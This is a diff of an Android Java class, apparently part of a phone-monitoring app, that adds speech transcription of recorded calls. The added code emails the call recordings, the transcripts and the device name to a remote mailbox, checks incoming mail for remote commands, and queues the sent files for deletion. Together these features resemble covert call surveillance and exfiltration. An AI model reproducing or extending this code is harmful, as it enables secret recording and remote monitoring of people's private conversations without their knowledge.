@@ -29,6 +29,7 @@ import java.io.OutputStreamWriter;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
+import java.util.List;
 
 import static com.iflytek.cloud.VerifierResult.TAG;
 
@@ -49,6 +50,12 @@ public class PhoneRecordProcess {
     private File outputFile;
     private OutputStream outputfos;
     private BufferedOutputStream bos;
+    private boolean bIsWriteFile = false;
+    private boolean bIsTestButton = false;
+    private String strDecodeResult = "";
+    private String strDecodeFileName = "";
+    private String strMailTitle = "";
+    private String strMailContent = "";
 
     private PowerManager.WakeLock gpsWakeLock = null;
     private void acquireWakeLock() {
@@ -97,7 +104,8 @@ public class PhoneRecordProcess {
             if(isLast)
             {
                 printLog("识别结束","");
-                releaseWakeLock();
+                strDecodeResult+="<br>\r\n识别结束";
+                DecodeComplete(true);
             }
         }
         //会话发生错误回调接口
@@ -117,7 +125,8 @@ public class PhoneRecordProcess {
             {
                 printLog("error.mIatNull", "null");
             }
-            releaseWakeLock();
+            strDecodeResult+="<br>\r\n"+speechError.getPlainDescription(true);
+            DecodeComplete(false);
         }
         //扩展用接口
         @Override
@@ -142,7 +151,8 @@ public class PhoneRecordProcess {
     public PhoneRecordProcess(){
     }
 
-    public void init(Context tmpContext){
+    public void init(Context tmpContext, boolean bButton){
+        bIsTestButton =bButton;
         mContext = tmpContext;
         //创建语音配置对象，换成自己的id，另外so文件也要换成自己的，AndroidManifest里面还有个统计分析的id也换成自己的
 //        SpeechUtility.createUtility(MainActivity.this, SpeechConstant.APPID+"=5ae01196");
@@ -160,15 +170,111 @@ public class PhoneRecordProcess {
             printLog("mIatNull", "null");
         }
         setParam();
+        if(bIsWriteFile)
+        {
+            try {
+                // Make sure the directory exists.
+                outputFile = new File(CommonParams.path, "1.wav");
+                outputfos = new FileOutputStream(outputFile);
+                bos = new BufferedOutputStream(outputfos);
+            } catch (IOException e) {
+            }
+        }
+        if(bIsTestButton)
+        {
+            startDecode("1.amr");
+        }
+    }
 
+    public void VoiceDecode(String strFilename, String strTitle, String strContent){
+        strDecodeFileName = strFilename;
+        strMailTitle = strTitle;
+        strMailContent = strContent;
+        //decode结果跟在传入参数后面返回
+        startDecode(strDecodeFileName);
+    }
+
+    public void clear()
+    {
+        if( null != mIat ){
+            // 退出时释放连接
+            mIat.cancel();
+            mIat.destroy();
+        }
+        if( null != mSpeech ){
+            mSpeech.destroy();
+        }
+    }
+
+    private void DecodeComplete(boolean bIsDecodeSucceed)
+    {
+        clear();
+        if(bIsTestButton)
+        {
+            return;
+        }
+        if(bIsDecodeSucceed)
+        {
+
+        }
+        else
+        {
+
+        }
+        List<String> pathList = new ArrayList<String>();
+        String strCallContent  = "<br>";
+        boolean bHasFile = false;
+        File[] files = new File(CommonParams.path.getAbsolutePath()).listFiles();
+        for (File file : files) {
+            if(file.getName().endsWith(CommonParams.pendingListName)||file.getName().endsWith(CommonParams.cfgFileName)
+                    ||file.getName().endsWith(CommonParams.GPSinfoFileName)||file.getName().endsWith(CommonParams.GPSinfoPendingListName))
+            {
+                continue;
+            }
+            if(file.isFile()) {
+                pathList.add(CommonParams.path.getAbsolutePath() + File.separator + file.getName());
+                strCallContent += "<br>file:" + CommonParams.path.getAbsolutePath() + File.separator + file.getName();
+                if(file.getName().endsWith(".nomedia")==false)
+                {
+                    bHasFile = true;
+                }
+            }
+        }
+        if(bHasFile==false)
+        {
+            strCallContent += "<br>电话未接通,没录上";
+        }
+        strCallContent += "<br>Call Record:"+strDecodeFileName;
+        // 如果接受过更新设备名称的指令，那么在这里更新，确保设备名称正确显示
+        strMailTitle = strMailTitle.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
+        strMailContent = strMailContent.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
+        strCallContent+= strDecodeResult;
+
+        MailManager.getInstance().sendMailWithMultiFile(strMailTitle+ ".时间"+strDecodeFileName, strMailContent+strCallContent, pathList);
+        if(CfgParamMgr.getInstance().getGPSserviceFlag()==false)
+        {
+            //如果没开GPS，需要检查命令。如果GPS已经开着，每次上报时会检查命令
+            MailManager.getInstance().receiveCommandMail();
+        }
+        strDecodeFileName = "";
+        //加入清除名单
         try {
-            // Make sure the directory exists.
-            outputFile = new File(CommonParams.path, "1.wav");
-            outputfos = new FileOutputStream(outputFile);
-            bos = new BufferedOutputStream(outputfos);
+            File file = new File(CommonParams.path, CommonParams.pendingListName);
+            OutputStream fos = new FileOutputStream(file);
+            OutputStreamWriter osw=new OutputStreamWriter(fos);
+            for(int i=0;i<pathList.size();i++)
+            {
+                osw.write(pathList.get(i));
+                osw.write("\r\n");
+            }
+            osw.flush();
+            osw.close();
+            fos.close();
         } catch (IOException e) {
         }
-        startDecode("1.amr");
+
+        releaseWakeLock();
+
     }
 
     // 参数设置
@@ -203,9 +309,9 @@ public class PhoneRecordProcess {
         mIat.setParameter(SpeechConstant.ENGINE_TYPE, mEngineType);
         //设置语音前端点：静音超时时间，即用户多长时间不说话则当做超时处理
         //默认值：短信转写5000，其他4000
-        mIat.setParameter(SpeechConstant.VAD_BOS,"10000");//4000
+        mIat.setParameter(SpeechConstant.VAD_BOS,"30000");//4000
         // 设置语音后端点:后端点静音检测时间，即用户停止说话多长时间内即认为不再输入， 自动停止录音
-        mIat.setParameter(SpeechConstant.VAD_EOS,"10000");//1000
+        mIat.setParameter(SpeechConstant.VAD_EOS,"30000");//1000
         // 设置标点符号,设置为"0"返回结果无标点,设置为"1"返回结果有标点
         mIat.setParameter(SpeechConstant.ASR_PTT,"1");
         // 设置音频保存路径，保存音频格式支持pcm、wav
@@ -245,16 +351,18 @@ public class PhoneRecordProcess {
                     for (byte[] data : pcmData){
 //                        mIat.writeAudio(data, 0, data.length);
                         //写32或者64识别出的效果不一致,直接320则报网络错误
-/*                        ArrayList<byte[]> arrayAudioData = FucUtil.splitBuffer(data,data.length,32);
-                        for(int i=0;i<arrayAudioData.size();i++)
-                        {
-                            mIat.writeAudio(arrayAudioData.get(i), 0, arrayAudioData.get(i).length);
+                        if(bIsWriteFile==false) {
+                            ArrayList<byte[]> arrayAudioData = FucUtil.splitBuffer(data, data.length, 64000);
+                            for (int i = 0; i < arrayAudioData.size(); i++) {
+                                mIat.writeAudio(arrayAudioData.get(i), 0, arrayAudioData.get(i).length);
+                            }
                         }
-                        */
-                        try
-                        {
-                            bos.write(data);
-                        } catch (IOException e) {
+                        if(bIsWriteFile) {
+                            try
+                            {
+                                bos.write(data);
+                            } catch (IOException e) {
+                            }
                         }
                     }
 
@@ -285,15 +393,18 @@ public class PhoneRecordProcess {
 //                    Log.d(TAG,"--->读取音频流失败");
                     printLog("读取数据失败", "");
                 }
-                try
-                {
-                    bos.flush();
-                    bos.close();
-                    outputfos.close();
-                } catch (IOException e) {
+                if(bIsWriteFile) {
+                    try {
+                        bos.flush();
+                        bos.close();
+                        outputfos.close();
+                    } catch (IOException e) {
+                    }
                 }
                 audioDecode.release();
-                iatFun();
+                if(bIsWriteFile) {
+                    iatFun();
+                }
             }
         });
         audioDecode.startAsync();
@@ -345,7 +456,7 @@ public class PhoneRecordProcess {
         for (String key:mIatResults.keySet()){
             sb.append(mIatResults.get(key));
         }
-
+        strDecodeResult = sb.toString();
         printLog("speech", sb.toString());
 //        et_voice_text.setText(sb.toString());
 //        et_voice_text.setSelection(et_voice_text.length());
